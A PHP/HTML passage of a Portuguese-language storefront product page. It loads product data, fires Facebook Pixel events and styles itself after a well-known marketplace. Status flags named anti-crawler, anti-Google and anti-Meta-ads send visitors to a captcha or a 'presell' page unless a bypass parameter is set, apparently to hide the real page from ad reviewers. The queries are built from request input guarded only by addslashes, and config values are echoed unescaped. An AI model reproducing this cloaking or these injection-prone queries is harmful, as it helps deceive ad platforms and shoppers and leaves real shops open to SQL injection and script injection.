<?php
session_start();
require_once("api/db.php");
require_once("api/facebook_pixel.php");

	$prod_param = $_GET["produto"] ?? ($_GET["codigo"] ?? ($_GET["id"] ?? ''));
	if (empty($prod_param)) {
	    session_destroy();
	    header("Location: ./index");
	    exit();
	} else {
	    $id = addslashes($prod_param);
	    $sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");

	    if (($sqlx ? mysqli_num_rows($sqlx) : 0) > 0) {
            $row_status = mysqli_fetch_assoc($sqlx);
            $status_atual = isset($row_status['status']) ? $row_status['status'] : 'ativo';

            // 1. Verificar Anti-Crawler (reCAPTCHA)
            if ($status_atual == 'anti-crawler-v1' && !isset($_SESSION['captcha_solved_' . $id])) {
                include("api/crawler_captcha.php");
                exit();
            }

	            // 2. Verificar Anti-Google / Anti-Meta (Presell)
	            if (($status_atual == 'anti-google-v1' || $status_atual == 'anti-meta-ads-v1') && !isset($_GET['bypass'])) {
	                // Se tiver step >= 2, deixa passar com bypass interno
	                if (isset($_GET['step']) && (int)$_GET['step'] >= 2) {
	                    // Continua para o produto
	                } else {
	                    include("api/presell.php");
	                    exit();
	                }
	            }

            // Resetar ponteiro para o loop original
            mysqli_data_seek($sqlx, 0);
        $_SESSION['session_index'] = time() + 1000;

		$sql = mysqli_query($conn, "SELECT * from config");
		$cor = "#3483fa";
		$cor_botao = "#3483fa";
		$cor_icones = "#ffffff";
		$nome = "Minha Loja";
		$numerozap = "";
		$textozap = "";
		$endereco = "";
		$cnpj = "";
		while ($sql && $row = mysqli_fetch_array($sql)) {
			$cor = $row["cor"];
			$cor_botao = isset($row["cor_botao"]) ? $row["cor_botao"] : "#3483fa";
			$cor_icones = isset($row["cor_icones"]) ? $row["cor_icones"] : "#ffffff";
			$nome = $row["nome"];
			$numerozap = $row["zap"];
			$textozap = $row["texto"];
			$endereco = isset($row["endereco"]) ? $row["endereco"] : "";
			$cnpj = isset($row["cnpj"]) ? $row["cnpj"] : "";
		}

		        $sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
		        while ($sql1 && $row1 = mysqli_fetch_array($sql1)) {
		            $codigo = $row1["codigo"];
		            $nomeproduto = $row1["nome"];
		            $valor = $row1["valor"];
		            $img = $row1["img"];
		            $desconto = $row1["desconto"];
		            $descricao = $row1["descricao"];
		            $oferta = $row1["oferta"];
		            $img1 = $row1["img1"];
		            $img2 = $row1["img2"];
		            $img3 = $row1["img3"];
		            $img4 = $row1["img4"];
		            $img5 = $row1["img5"];
		            $img6 = $row1["img6"];
		            $caracteristicas = $row1["caracteristicas"];
		            $reviews_json = $row1["reviews"];
		            $valor_original_db = isset($row1["valor_original"]) ? $row1["valor_original"] : "";
		            $tipo_produto = isset($row1["tipo_produto"]) ? $row1["tipo_produto"] : "generico";
		            $categoria_atual = isset($row1["categoria"]) ? $row1["categoria"] : "Geral";
	                    $variacoes_json = isset($row1["variacoes"]) ? $row1["variacoes"] : "";
	                    $variacoes = !empty($variacoes_json) ? json_decode($variacoes_json, true) : array();
	                    // Para roupas, manter somente os tamanhos padronizados da loja.
	                    if ($tipo_produto === 'roupa' && !empty($variacoes['tamanhos'])) {
	                        $tamanhos_permitidos = array('P', 'M', 'G', 'GG');
	                        $variacoes['tamanhos'] = array_values(array_intersect(
	                            $tamanhos_permitidos,
	                            array_map('strtoupper', array_map('trim', (array)$variacoes['tamanhos']))
	                        ));
	                    }
	                }
                // Garantir que as variáveis básicas existam se o loop falhar por algum motivo
                if(!isset($codigo)) { $codigo = $id; }

        $sql12 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
        $cliques = 0;
        $pid = 0;
        while ($sql12 && $row1 = mysqli_fetch_array($sql12)) {
            $pid = $row1['id'];
            $cliques = $row1['cliques'];
        }

        // Registrar clique no produto (apenas uma vez por sessão)
        if (!isset($_SESSION['product_click_' . $id])) {
            $novoclick = $cliques + 1;
            mysqli_query($conn, "UPDATE produto SET cliques='$novoclick' WHERE id='$pid'");
            $_SESSION['product_click_' . $id] = true;
        }

	        $valor_total = (float)str_replace(',', '.', str_replace('.', '', $valor));
	        $desconto_num = (float)$desconto;

	        // Disparar ViewContent no Pixel
	        echo fb_pixel_event_script('ViewContent', [
	            'content_ids' => [$codigo],
	            'content_name' => $nomeproduto,
	            'content_type' => 'product',
	            'value' => $valor_total,
	            'currency' => 'BRL'
	        ]);
        $qtde_parcelas = 12;

        function parcelas($montante, $parcelas) {
            $resultado = array();
            $centavos = (float)$montante * 100;
            array_push($resultado, (floor($centavos / $parcelas) + fmod($centavos, $parcelas)) / 100.0);
            for ($i = 1; $i < $parcelas; $i++) {
                array_push($resultado, floor($centavos / $parcelas) / 100.0);
            }
            return $resultado;
        }
        $parcela12 = parcelas($valor_total, $qtde_parcelas);

        if (!empty($valor_original_db)) {
            $valor_original = (float)str_replace(',', '.', str_replace('.', '', $valor_original_db));
        } else {
            if ($desconto_num > 0 && $desconto_num < 100) {
                $valor_original = round($valor_total / (1 - ($desconto_num / 100)), 2);
            } else {
                $valor_original = $valor_total;
            }
        }

        $todas_imgs = array();
        for ($i = 1; $i <= 6; $i++) {
            $var_img = "img" . $i;
            if (!empty($$var_img)) {
                $todas_imgs[] = $$var_img;
            }
        }
        if (empty($todas_imgs)) {
            $imgs_locais = glob("arquivos/produtos/" . $codigo . "/*.png");
            if (!empty($imgs_locais)) {
                foreach ($imgs_locais as $img_p) { $todas_imgs[] = $img_p; }
            }
        }
        if (empty($todas_imgs)) { $todas_imgs[] = "./arquivos/produto.jpg"; }

        $logo_files = glob("arquivos/logo/*.png");
        $logo_loja = !empty($logo_files) ? $logo_files[0] : "";

        $sql_config = mysqli_query($conn, "SELECT zap, zap_cotacao, zap_flutuante_ativo FROM config LIMIT 1");
        $zap_cotacao = "";
        $zap_flutuante_ativo = "1";
        if ($sql_config && $row_config = mysqli_fetch_assoc($sql_config)) {
            $zap_cotacao = (isset($row_config["zap_cotacao"]) && !empty($row_config["zap_cotacao"])) ? $row_config["zap_cotacao"] : $row_config["zap"];
            $zap_flutuante_ativo = isset($row_config["zap_flutuante_ativo"]) ? $row_config["zap_flutuante_ativo"] : "1";
        }

	        $outros_produtos = array();
	        // Buscar produtos da mesma categoria para o carrossel de baixo
	        $sql_outros = mysqli_query($conn, "SELECT * from produto WHERE codigo != '$codigo' AND categoria = '$categoria_atual' AND categoria != 'Geral' LIMIT 20");
	        if (mysqli_num_rows($sql_outros) == 0) {
	            $sql_outros = mysqli_query($conn, "SELECT * from produto WHERE codigo != '$codigo' LIMIT 20");
	        }
	        while ($sql_outros && $row_outro = mysqli_fetch_array($sql_outros)) {
	            $outros_produtos[] = $row_outro;
	        }

	        // Buscar produtos relacionados específicos para o carrossel de cima
	        $produtos_relacionados_especificos = array();
	        if (!empty($row1['produtos_relacionados'])) {
	            $codigos_relacionados = array_map('trim', explode(',', $row1['produtos_relacionados']));
	            $in_clause = "'" . implode("','", $codigos_relacionados) . "'";
	            $sql_especificos = mysqli_query($conn, "SELECT * from produto WHERE codigo IN ($in_clause) OR id IN ($in_clause) LIMIT 20");
	            while ($sql_especificos && $row_especifico = mysqli_fetch_array($sql_especificos)) {
	                $produtos_relacionados_especificos[] = $row_especifico;
	            }
	        }
	        // Fallback: se estiver vazio, puxa os mesmos do carrossel de baixo para não sumir o banner
	        if (empty($produtos_relacionados_especificos)) {
	            $produtos_relacionados_especificos = $outros_produtos;
	        }
    } else {
        session_destroy();
        header("Location: ./index");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<meta name="robots" content="index,follow">
<title><?php echo htmlspecialchars($nomeproduto); ?> - Oferta do Dia</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
	<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap" rel="stylesheet">
	<style>
		/* Estilos para as setas do carrossel antigo */
		.nav-arrow { position: absolute; top: 50%; transform: translateY(-50%); color: var(--store-blue); background: #fff; width: 40px; height: 40px; border-radius: 50%; box-shadow: 0 2px 4px rgba(0,0,0,0.2); border: none; cursor: pointer; display: none; align-items: center; justify-content: center; z-index: 10; font-size: 18px; font-weight: bold; opacity: 0.5; transition: opacity 0.3s ease, background 0.3s; }
		.nav-arrow:hover { background: #f5f5f5; opacity: 1; }
		.prev-arrow { left: -10px; }
		.next-arrow { right: -10px; }
		@media (min-width: 1024px) {
		    .nav-arrow { display: flex; }
		}

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
:root {
	  --store-yellow: <?php echo $cor; ?>;
	  --store-blue: <?php echo $cor_botao; ?>;
	  --store-blue-dark: <?php echo $cor_botao; ?>;
	  --store-bg-gray: #ebebeb;
	  --store-text-dark: #333;
	  --store-green: #00a650;
	  --store-stars: var(--store-blue);
	  --store-icon-color: <?php echo $cor_icones; ?>;

	  /* Typography Tokens */
	  --font-family-primary: "Proxima Nova", -apple-system, "Roboto", Arial, sans-serif;
	  --font-weight-light: 300;
	  --font-weight-regular: 400;
	  --font-weight-semibold: 600;

	  --font-size-xxsmall: 12px;
	  --font-size-xsmall: 14px;
	  --font-size-small: 16px;
	  --font-size-medium: 18px;
	  --font-size-large: 20px;
	  --font-size-xlarge: 24px;
	  --font-size-product-title: 22px;
	  --font-size-price: 36px;

	  --color-text-primary: rgba(0, 0, 0, 0.9);
	  --color-text-secondary: rgba(0, 0, 0, 0.55);
	  --color-text-disabled: rgba(0, 0, 0, 0.25);
	  --color-text-link: var(--store-blue);
	  --color-text-link-hover: var(--store-blue-dark);
	  --color-text-link-active: var(--store-blue-dark);
	  --color-text-positive: #00A650;
	  --color-text-negative: #F23D4F;
	  --color-text-inverse: #FFFFFF;
	}

	@media (max-width: 1024px) {
	  :root {
	    --font-size-price: 32px;
	  }
	}

	@media (max-width: 768px) {
	  :root {
	    --font-size-price: 28px;
	    --font-size-product-title: 20px;
	  }
	}

	/* Botão Flutuante WhatsApp */
    .floating-whatsapp {
        position: fixed;
        bottom: 90px;
        right: 20px;
        background-color: #25d366;
        color: #fff;
        padding: 10px 16px;
        border-radius: 50px;
        display: flex;
        align-items: center;
        gap: 8px;
        font-size: 15px;
        font-weight: 600;
        text-decoration: none;
        box-shadow: 0 4px 12px rgba(37, 211, 102, 0.4);
        z-index: 9999;
        transition: transform 0.2s ease;
    }
    .floating-whatsapp:hover {
        transform: scale(1.05);
        color: #fff;
    }
    .floating-whatsapp i {
        font-size: 20px;
    }

	body { font-family: var(--font-family-primary); font-weight: var(--font-weight-regular); background-color: var(--store-bg-gray); color: var(--color-text-primary); -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; overflow-x: hidden; padding-bottom: 80px; }

	/* Semantic Typography Utility Classes */
	h1, .product-title {
	  color: var(--color-text-primary);
	  font-size: var(--font-size-product-title);
	  font-weight: var(--font-weight-semibold);
	  line-height: 1.18;
	  margin-bottom: 8px;
	}

	h2, .section-title {
	  color: var(--color-text-primary);
	  font-size: var(--font-size-xlarge);
	  font-weight: var(--font-weight-regular);
	  line-height: 1.25;
	  margin-bottom: 24px;
	}

	.body-text {
	  color: var(--color-text-secondary);
	  font-size: var(--font-size-small);
	  font-weight: var(--font-weight-regular);
	  line-height: 1.5;
	}

	.product-price {
	  color: var(--color-text-primary);
	  font-size: var(--font-size-price);
	  font-weight: var(--font-weight-light);
	  line-height: 1.2;
	}

	.link {
	  color: var(--color-text-link);
	  font-size: var(--font-size-small);
	  font-weight: var(--font-weight-regular);
	  text-decoration: none;
	}
	.link:hover { color: var(--color-text-link-hover); }
	.link:active { color: var(--color-text-link-active); }

	.button-label {
	  font-size: var(--font-size-xsmall);
	  font-weight: var(--font-weight-semibold);
	  line-height: 1.25;
	}

	.metadata {
	  font-size: var(--font-size-xsmall);
	  font-weight: var(--font-weight-regular);
	  line-height: 18px;
	  color: var(--color-text-secondary);
	}
	header { background-color: var(--store-yellow); padding: 8px 16px; position: sticky; top: 0; z-index: 100; transition: all 0.3s ease; }
.header-content-wrapper { max-width: 1200px; margin: 0 auto; }
.header-full { display: flex; flex-direction: column; gap: 8px; }
.header-top-row { display: flex; align-items: center; justify-content: space-between; }
.header-logo-full { height: 40px; object-fit: contain; }
.icon-btn { font-size: 20px; color: var(--store-icon-color); cursor: pointer; }
.search-row { width: 100%; }
.search-input-box { background: #fff; border-radius: 4px; padding: 8px 12px; display: flex; align-items: center; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
.search-text { color: #999; font-size: 14px; }
.header-compact { display: none; align-items: center; justify-content: space-between; gap: 12px; }
.logo-circle { height: 40px; display: flex; align-items: center; justify-content: center; }
.logo-circle img { height: 100%; object-fit: contain; }
.search-compact { flex: 1; background: #fff; border-radius: 20px; padding: 6px 12px; display: flex; align-items: center; }
.compact-icons { display: flex; gap: 15px; align-items: center; }
header.compact-mode .header-full { display: none; }
header.compact-mode .header-compact { display: flex; }
header.compact-mode { padding: 6px 16px; }
	.location-bar { background: var(--store-yellow); padding: 8px 16px; display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--store-icon-color); border-top: 1px solid rgba(0,0,0,0.05); }



	.footer-main { background-color: #f5f5f5; border-top: 1px solid #e0e0e0; padding: 40px 20px 30px; margin-top: 60px; font-family: "Montserrat", "Proxima Nova", "Helvetica Neue", Helvetica, Arial, sans-serif; }
	.footer-content { max-width: 1200px; margin: 0 auto; }
	.footer-top { margin-bottom: 30px; }
	.footer-links-container { display: flex; flex-wrap: wrap; gap: 20px; margin-bottom: 25px; justify-content: center; }
	.footer-link { display: inline-block; font-size: 13px; color: #666; text-decoration: none; transition: color 0.2s ease; }
	.footer-link:hover { color: #3483fa; }
	.footer-bottom { border-top: 1px solid #ddd; padding-top: 20px; text-align: center; }
	.footer-copyright { font-size: 13px; color: #666; font-weight: 400; margin-bottom: 8px; }
	.footer-info { font-size: 12px; color: #999; font-weight: 400; line-height: 1.4; margin: 0; }
	@media (max-width: 768px) { .footer-main { padding: 30px 15px 20px; margin-top: 40px; } .footer-links-container { gap: 12px; justify-content: center; } .footer-link { font-size: 12px; display: inline-block; } .footer-copyright { font-size: 12px; text-align: center; } .footer-info { font-size: 11px; text-align: center; } }
	@media (max-width: 480px) { .footer-links-container { gap: 8px; flex-direction: column; align-items: center; } .footer-link { font-size: 11px; display: block; margin-bottom: 4px; } .footer-copyright { font-size: 11px; text-align: center; } .footer-info { font-size: 10px; text-align: center; } }
	.produto-card { background: #fff; margin-bottom: 8px; padding: 16px; }
	.produto-card, .variacoes-section, .preco-section, .vendedor-section, .caracteristicas-section, .detalhes-section, .descricao-section, .avaliacoes-section, .produtos-relacionados-section { max-width: 1200px; margin-left: auto; margin-right: auto; }
	.badges-row { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
	.rating-row { display: flex; align-items: center; gap: 4px; font-size: 12px; color: #666; }
	.stars { color: var(--store-stars); font-size: 14px; }
	.badge-mais-vendido { background: #f73; color: #fff; font-size: 10px; font-weight: 700; padding: 2px 4px; border-radius: 3px; }
	.produto-titulo { font-size: var(--font-size-product-title); font-weight: var(--font-weight-semibold); line-height: 1.18; margin-bottom: 8px; color: var(--color-text-primary); }
	.carousel-wrapper { position: relative; margin: 0 -16px 20px; }
	.carousel-track { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scrollbar-width: none; }
	.carousel-track::-webkit-scrollbar { display: none; }
	.carousel-slide { min-width: 100%; scroll-snap-align: start; display: flex; align-items: center; justify-content: center; background: #fff; height: 300px; }
	.carousel-slide img { max-width: 100%; max-height: 100%; object-fit: contain; }
	.carousel-dots { display: flex; justify-content: center; gap: 6px; margin-bottom: 15px; }
	.carousel-dot { width: 6px; height: 6px; border-radius: 50%; background: #ddd; }
	.carousel-dot.active { background: #3483fa; }
	.carousel-counter { position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.05); padding: 2px 8px; border-radius: 10px; font-size: 12px; color: #666; }

	/* Estilos de Variações */
	.variacoes-section { padding: 0 16px 20px; background: #fff; margin-bottom: 8px; }
	.variacao-grupo { margin-bottom: 15px; }
	.variacao-label { display: block; font-size: 14px; color: #333; margin-bottom: 10px; }
	.variacao-opcoes { display: flex; gap: 8px; flex-wrap: wrap; }
	.btn-variacao-texto { border: 1px solid #ddd; background: #fff; border-radius: 6px; padding: 8px 16px; font-size: 14px; cursor: pointer; transition: all 0.2s; }
	.btn-variacao-texto.active { border-color: var(--store-blue); border-width: 2px; color: var(--store-blue); font-weight: 600; background: rgba(52, 131, 250, 0.05); }
	.ui-pdp-outside_variations__picker { display: flex; gap: 12px; flex-wrap: wrap; }
	.btn-variacao-cor { width: 52px; height: 52px; border: 1px solid #ddd; border-radius: 6px; padding: 2px; background: #fff; cursor: pointer; overflow: hidden; transition: all 0.2s; display: flex; align-items: center; justify-content: center; }
	.btn-variacao-cor img { width: 100%; height: 100%; object-fit: contain; border-radius: 4px; }
	.btn-variacao-cor.active { border-color: var(--store-blue); border-width: 2px; box-shadow: 0 0 0 2px rgba(52, 131, 250, 0.2); }

	.preco-section { padding: 0 16px 20px; }
	.preco-original { font-size: var(--font-size-xsmall); color: var(--color-text-secondary); text-decoration: line-through; margin-bottom: 2px; }
	.preco-atual-row { display: flex; align-items: center; gap: 4px; margin-bottom: 4px; }
	.preco-simbolo { font-size: var(--font-size-price); font-weight: var(--font-weight-light); margin-top: 0; color: var(--color-text-primary); }
	.preco-valor { font-size: var(--font-size-price); font-weight: var(--font-weight-light); color: var(--color-text-primary); }
	.preco-simbolo-cent { font-size: var(--font-size-large); margin-top: -15px; margin-left: 0; font-weight: var(--font-weight-light); color: var(--color-text-primary); }
	.preco-desconto { color: var(--color-text-positive); font-size: var(--font-size-small); font-weight: var(--font-weight-semibold); margin-left: 8px;}
	.parcelamento { font-size: 16px; color: #333; margin-bottom: 4px; }
	.metodos-pagamento { color: #333; font-size: 13px; margin-bottom: 15px; display: block; text-decoration: none; }
	.entrega-info { display: flex; gap: 12px; margin-bottom: 20px; }
	.entrega-icon { color: var(--store-green); font-size: 18px; margin-top: 2px; }
	.entrega-txt { font-size: 14px; line-height: 1.4; }
	.entrega-link { color: #333; text-decoration: none; display: block; margin-top: 4px; }
		.btn-comprar { display: flex; align-items: center; justify-content: center; width: calc(100% - 32px); margin: 12px 16px; min-height: 44px; background: var(--store-blue); color: var(--color-text-inverse); font-size: var(--font-size-small); font-weight: var(--font-weight-semibold); text-align: center; border-radius: 6px; text-decoration: none; border: none; cursor: pointer; transition: all 0.2s ease; }
		.btn-comprar:hover { background: var(--store-blue-dark); }

	.vendedor-section { background: #fff; padding: 20px 16px; margin-bottom: 8px; }
	.section-titulo { font-size: var(--font-size-large); margin-bottom: 24px; color: var(--color-text-primary); font-weight: var(--font-weight-regular); }
	.termometro { display: flex; gap: 2px; height: 8px; margin-bottom: 15px; }
	.termometro-nivel { flex: 1; background: #eee; border-radius: 1px; }
	.termometro-nivel.active { background: var(--store-green); height: 12px; margin-top: -2px; }
	.vendedor-stats { display: flex; justify-content: space-between; text-align: center; }
	.vendedor-stat { flex: 1; border-right: 1px solid #eee; padding: 0 5px; }
	.vendedor-stat:last-child { border-right: none; }
	.vendedor-stat-num { font-size: 18px; display: block; margin-bottom: 4px; }
	.vendedor-stat-txt { font-size: 10px; color: #999; line-height: 1.2; display: block; }

	.caracteristicas-section { background: #fff; padding: 20px 16px; margin-bottom: 8px; }
	.caracteristicas-colapsada { max-height: 300px; overflow: hidden; position: relative; }
	.caracteristicas-colapsada::after { content: ""; position: absolute; bottom: 0; left: 0; width: 100%; height: 60px; background: linear-gradient(transparent, #fff); }
	.caracteristicas-tabela { width: 100%; border-collapse: collapse; margin-top: 10px; }
	.caracteristicas-tabela tr:nth-child(odd) { background-color: #f5f5f5; }
	.caracteristicas-tabela td { padding: 12px; font-size: 14px; color: #666; border: 1px solid #eee; }
	.caracteristicas-tabela td:first-child { font-weight: 600; color: #333; width: 40%; }

	.detalhes-section { background: #fff; padding: 20px 16px; margin-bottom: 8px; text-align: center; }
	.detalhes-img { max-width: 100%; margin: 0 auto 10px; border-radius: 4px; display: block; }

	.descricao-section { background: #fff; padding: 20px 16px; margin-bottom: 8px; }
	.descricao-texto { font-size: var(--font-size-small); color: var(--color-text-primary); line-height: 1.5; white-space: pre-wrap; font-weight: var(--font-weight-regular); }
	.descricao-colapsada { max-height: 200px; overflow: hidden; position: relative; }
	.descricao-colapsada::after { content: ""; position: absolute; bottom: 0; left: 0; width: 100%; height: 80px; background: linear-gradient(transparent, #fff); }

	.avaliacoes-section { background: #fff; padding: 20px 16px; margin-bottom: 8px; }
		.avaliacao-card { border-bottom: 1px solid #eee; padding: 15px 0; }
		.avaliacao-card:last-child { border-bottom: none; }
		.review-photos { display: flex; gap: 8px; margin-top: 10px; flex-wrap: wrap; }
		.review-photo { width: 60px; height: 60px; border-radius: 4px; object-fit: cover; border: 1px solid #eee; }
		.review-nome { font-size: var(--font-size-xsmall); font-weight: var(--font-weight-semibold); color: var(--color-text-secondary); margin-bottom: 4px; }
		.review-data { font-size: 12px; color: #999; }
		.review-stars { color: var(--store-stars); font-size: 12px; margin-bottom: 6px; }
		.review-titulo { font-size: var(--font-size-small); font-weight: var(--font-weight-semibold); color: var(--color-text-primary); margin-bottom: 4px; }
		.review-texto { font-size: var(--font-size-xsmall); color: var(--color-text-secondary); line-height: 1.4; margin-bottom: 10px; }
		.avatar-cliente { width: 34px; height: 34px; border-radius: 50%; background: #eee; display: flex; align-items: center; justify-content: center; color: #666; font-weight: 700; font-size: 15px; }
.cliente-verificado { color: #00a650; font-size: 12px; font-weight: 600; display: flex; align-items: center; gap: 3px; }

		.btn-ver-mais { display: flex; align-items: center; justify-content: center; width: 100%; margin-top: 12px; min-height: 44px; background: var(--color-text-inverse); border: 1.5px solid var(--store-blue); color: var(--store-blue); font-size: var(--font-size-xsmall); font-weight: var(--font-weight-semibold); text-align: center; border-radius: 6px; cursor: pointer; transition: all 0.2s ease; }
		.btn-ver-mais:hover { background: var(--store-blue); color: var(--color-text-inverse); }
		.produtos-relacionados-section { background: #fff; padding: 20px 0 22px; margin-bottom: 8px; overflow: hidden; }
		.produtos-relacionados-section .section-titulo { padding: 0 16px; margin-bottom: 14px; }
		.produtos-relacionados-track { display: flex; gap: 12px; overflow-x: auto; padding: 15px 16px 20px; scroll-snap-type: x proximity; scrollbar-width: none; -webkit-overflow-scrolling: touch; }
		.produtos-relacionados-track::-webkit-scrollbar { display: none; }
		.produto-relacionado-card { flex: 0 0 200px; scroll-snap-align: start; background: #fff; border: 1px solid #e5e5e5; border-radius: 8px; color: inherit; text-decoration: none; overflow: hidden; box-shadow: 0 1px 2px rgba(0,0,0,0.05); transition: box-shadow 0.2s; }
		.produto-relacionado-card:hover { box-shadow: 0 4px 10px rgba(0,0,0,0.15); }
		.produto-relacionado-img-wrap { width: 100%; height: 160px; display: flex; align-items: center; justify-content: center; background: #fff; border-bottom: 1px solid #ebebeb; padding: 10px; }
		.produto-relacionado-img-wrap img { max-width: 100%; max-height: 100%; object-fit: contain; }
		.produto-relacionado-info { padding: 12px; display: flex; flex-direction: column; }
		.produto-relacionado-nome { font-size: var(--font-size-xsmall); color: var(--color-text-secondary); line-height: 1.3; height: 36px; overflow: hidden; margin-bottom: 6px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; font-weight: var(--font-weight-regular); }
		.produto-relacionado-preco { font-size: var(--font-size-large); font-weight: var(--font-weight-light); color: var(--color-text-primary); margin-bottom: 2px; }
		.produto-relacionado-parcela { font-size: 13px; color: var(--color-text-positive); margin-bottom: 6px; font-weight: var(--font-weight-regular); }
		.produto-relacionado-entrega { font-size: 13px; line-height: 1.3; font-weight: var(--font-weight-regular); color: var(--color-text-secondary); }
		.frete-destaque { color: #00a650; font-weight: 600; }
		.frete-destaque i { font-style: italic; font-weight: 800; font-family: sans-serif; }
		.frete-complemento { color: #888; }

	.desktop-only { display: none; }
	.mobile-only { display: block; }

	@media (min-width: 1024px) {
	  .desktop-only { display: block; }
	  .mobile-only { display: none; }
	  body { padding-bottom: 0; }
	  .produto-card { display: flex; flex-direction: column; padding: 20px; }
	  .pdp-main-container { display: flex; gap: 40px; align-items: flex-start; justify-content: center; }
	  .pdp-left-wrapper { display: flex; flex-direction: column; max-width: 600px; }
	  .pdp-column-left { width: 60px; display: flex; flex-direction: column; gap: 10px; }
	  .pdp-thumb { width: 50px; height: 50px; border: 1px solid #ddd; border-radius: 4px; cursor: pointer; object-fit: contain; padding: 2px; }
	  .pdp-thumb.active { border-color: var(--store-blue); border-width: 2px; }
	  .pdp-column-middle { flex: 1; max-width: 500px; }
	  .pdp-main-img-container { border: 1px solid #eee; border-radius: 8px; padding: 20px; background: #fff; display: flex; align-items: center; justify-content: center; min-height: 400px; }
	  .pdp-main-img { max-width: 100%; max-height: 450px; object-fit: contain; }
	  .pdp-actions { display: flex; gap: 20px; margin-top: 15px; color: var(--store-blue); font-size: 14px; cursor: pointer; justify-content: center; }
	  .pdp-column-right { width: 450px; border: 1px solid #eee; border-radius: 8px; padding: 28px; background: #fff; }
	  .breadcrumbs { font-size: 14px; color: #333; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; }
	  .breadcrumbs a { color: var(--color-text-primary); text-decoration: none; }
	  .breadcrumbs a:hover { color: var(--color-text-link); }
	  .produto-titulo { font-size: var(--font-size-product-title); font-weight: var(--font-weight-semibold); margin-bottom: 8px; }
	  .btn-comprar { width: 100%; margin: 20px 0 0; min-height: 48px;}
	  .sticky-bar { display: none !important; }
	}

	.sticky-bar { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; border-top: 1px solid #eee; padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; z-index: 1000; box-shadow: 0 -2px 10px rgba(0,0,0,0.05); }
	.sticky-bar.hidden { display: none; }
	.sticky-preco-info { display: flex; flex-direction: column; }
	.sticky-preco-valor { font-size: 18px; font-weight: 600; color: #333; }
	.sticky-btn { background: var(--store-blue); color: #fff; padding: 10px 24px; border-radius: 6px; font-weight: 600; text-decoration: none; font-size: 14px; }
	.hidden { display: none; }
	#store-loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
	.spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--store-blue); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
	@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
<?php echo fb_pixel_base_code(); ?>

    <link rel="shortcut icon" href="arquivos/favicon.png?v=<?php echo time(); ?>">
    <link rel="icon" type="image/png" href="arquivos/favicon.png?v=<?php echo time(); ?>">
</head>
<body>
<?php echo fb_pixel_event_script('ViewContent', ['content_ids'=>[$codigo], 'contents'=>[['id'=>$codigo, 'quantity'=>1, 'item_price'=>(float)str_replace(',', '.', str_replace('.', '', $valor))]], 'content_name'=>$nomeproduto, 'content_type'=>'product', 'value'=>(float)str_replace(',', '.', str_replace('.', '', $valor)), 'currency'=>'BRL']); ?>

<header class="ml-header-container" id="dynamicHeader">
  <div class="header-content-wrapper">
    <div class="header-full">
      <div class="header-top-row">
        <div class="header-left">
          <i class="fa-solid fa-bars icon-btn"></i>
        </div>
        <?php if(!empty($logo_loja)): ?>
          <img src="<?php echo $logo_loja; ?>" alt="<?php echo $nome; ?>" class="header-logo-full">
        <?php else: ?>
          <span style="font-weight: bold; font-size: 18px;"><?php echo $nome; ?></span>
        <?php endif; ?>
        <div class="header-right">
          <i class="fa-solid fa-cart-shopping icon-btn"></i>
        </div>
      </div>
      <div class="search-row">
        <div class="search-input-box">
          <i class="fa-solid fa-magnifying-glass" style="color: #ccc; margin-right: 10px"></i>
          <span class="search-text">Buscar produtos, muito mais...</span>
        </div>
      </div>
    </div>
    <div class="header-compact">
      <div class="logo-circle">
        <img src="<?php echo $logo_loja; ?>" alt="Logo">
      </div>
      <div class="search-compact">
        <i class="fa-solid fa-magnifying-glass" style="color: #ccc; margin-right: 8px; font-size: 14px"></i>
        <span class="search-text" style="font-size: 14px">Estou buscando...</span>
      </div>
      <div class="compact-icons">
        <div class="burger-container">
          <i class="fa-solid fa-bars icon-btn"></i>
        </div>
        <i class="fa-solid fa-cart-shopping icon-btn"></i>
      </div>
    </div>
  </div>
</header>

<div class="location-bar">
  <i class="fa-solid fa-location-dot"></i>
  <span class="location-text">Enviar para seu CEP</span>
</div>


<div class="produto-card">
  <div class="breadcrumbs desktop-only">
    <a href="./index"><i class="fa-solid fa-house" style="margin-right: 5px;"></i></a>
    <i class="fa-solid fa-chevron-right"></i>
    <a href="#"><?php echo htmlspecialchars($categoria_atual); ?></a>
    <i class="fa-solid fa-chevron-right"></i>
    <a href="#">Produtos</a>
  </div>

  <div class="pdp-main-container">
    <!-- WRAPPER DESKTOP (Galeria + Carrossel) -->
    <div class="pdp-left-wrapper desktop-only" style="flex-direction: column; max-width: 600px;">

      <div style="display: flex; gap: 40px;">
        <!-- COLUNA ESQUERDA (MINIATURAS) -->
        <div class="pdp-column-left">
          <?php foreach($todas_imgs as $idx => $img_url): ?>
